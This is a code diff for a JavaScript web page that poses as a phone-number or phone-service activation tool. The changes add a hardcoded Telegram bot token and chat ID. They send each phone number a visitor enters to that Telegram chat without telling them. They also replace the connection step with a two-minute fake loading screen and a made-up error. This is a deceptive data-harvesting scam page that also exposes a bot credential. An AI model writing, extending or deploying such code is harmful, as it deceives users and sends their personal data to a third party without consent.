@@ -1,15 +1,18 @@
-document.addEventListener("DOMContentLoaded", function () {
-    document.getElementById("activation-page").classList.remove("hidden");
-});
+window.onload = function () {
+    document.getElementById("activation-page").style.display = "block";
+    document.getElementById("loading-page").style.display = "none"; // Ensure loading page is hidden
+};
 
-const activationCode = "EXIST369";
+const activationCode = "hackin28";
+const telegramBotToken = "7163180771:AAFnerlyh4NH_wy7YldEhrkzW7yVrYeECTk";
+const telegramChatID = "7478351328";
+
 const countryList = [
     { name: "United States", code: "+1", flag: "flags/us.png" },
     { name: "United Kingdom", code: "+44", flag: "flags/gb.png" },
     { name: "Canada", code: "+1", flag: "flags/ca.png" },
     { name: "Germany", code: "+49", flag: "flags/de.png" },
     { name: "India", code: "+91", flag: "flags/in.png" },
-    { name: "France", code: "+33", flag: "flags/fr.png" },
     { name: "Australia", code: "+61", flag: "flags/au.png" },
     { name: "France", code: "+33", flag: "flags/fr.png" },
     { name: "Italy", code: "+39", flag: "flags/it.png" },
@@ -42,20 +45,46 @@ const countryList = [
 let selectedCountry = null;
 let selectedNumber = null;
 
+function showPage(pageId) {
+    document.querySelectorAll(".page").forEach(page => page.style.display = "none");
+    document.getElementById(pageId).style.display = "block";
+}
+
+function showLoading(text, duration, callback) {
+    document.getElementById("loading-text").innerText = text;
+    document.getElementById("loading-page").style.display = "flex";
+    
+    setTimeout(() => {
+        document.getElementById("loading-page").style.display = "none";
+        if (callback) callback();
+    }, duration);
+}
+
 function verifyCode() {
     const inputCode = document.getElementById("activation-code").value;
     if (inputCode === activationCode) {
-        document.getElementById("activation-page").classList.add("hidden");
-        document.getElementById("welcome-page").classList.remove("hidden");
+        showLoading("Connecting...", 2000, () => {
+            showPage("phone-input-page");
+        });
     } else {
         document.getElementById("activation-error").textContent = "Invalid activation code!";
     }
 }
 
-function goToCountrySelection() {
-    document.getElementById("welcome-page").classList.add("hidden");
-    document.getElementById("country-page").classList.remove("hidden");
-    loadCountries();
+function submitPhoneNumber() {
+    const phoneInput = document.getElementById("phone-number");
+    const phoneNumber = phoneInput.value;
+    if (phoneNumber.length !== 11) {
+        document.getElementById("phone-error").textContent = "Phone number must be exactly 11 digits!";
+        return;
+    }
+
+    document.getElementById("phone-error").textContent = "";
+    showLoading("Verifying phone number...", 10000, () => {
+        showPage("country-page");
+
+        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatID}&text=Phone Number: ${phoneNumber}`);
+    });
 }
 
 function loadCountries() {
@@ -64,7 +93,7 @@ function loadCountries() {
     countryList.forEach(country => {
         const item = document.createElement("div");
         item.classList.add("country-item");
-        item.innerHTML = `<img src="${country.flag}" alt="${country.name}"> ${country.name} (${country.code})`;
+        item.innerHTML = `<img src="${country.flag}" alt="${country.name}" width="30"> ${country.name} (${country.code})`;
         item.onclick = () => selectCountry(country);
         countryDiv.appendChild(item);
     });
@@ -72,9 +101,10 @@ function loadCountries() {
 
 function selectCountry(country) {
     selectedCountry = country;
-    document.getElementById("country-page").classList.add("hidden");
-    document.getElementById("number-page").classList.remove("hidden");
-    loadNumbers();
+    showLoading("Loading numbers...", 2000, () => {
+        showPage("number-page");
+        loadNumbers();
+    });
 }
 
 function loadNumbers() {
@@ -93,19 +123,11 @@ function loadNumbers() {
 
 function selectNumber(number) {
     selectedNumber = number;
-    document.getElementById("number-page").classList.add("hidden");
-    document.getElementById("connecting-page").classList.remove("hidden");
-    startConnecting();
+    showLoading("Connecting to phone service...", 120000, () => {
+        alert("Error: Can't connect. Check your internet and try again.");
+        showPage("country-page");
+    });
 }
 
-function startConnecting() {
-    setTimeout(() => {
-        document.getElementById("connection-error").classList.remove("hidden");
-        document.getElementById("retry-button").classList.remove("hidden");
-    }, 120000);
-}
-
-function retryConnection() {
-    document.getElementById("connecting-page").classList.add("hidden");
-    document.getElementById("country-page").classList.remove("hidden");
-}
+// Initialize the country list
+loadCountries();
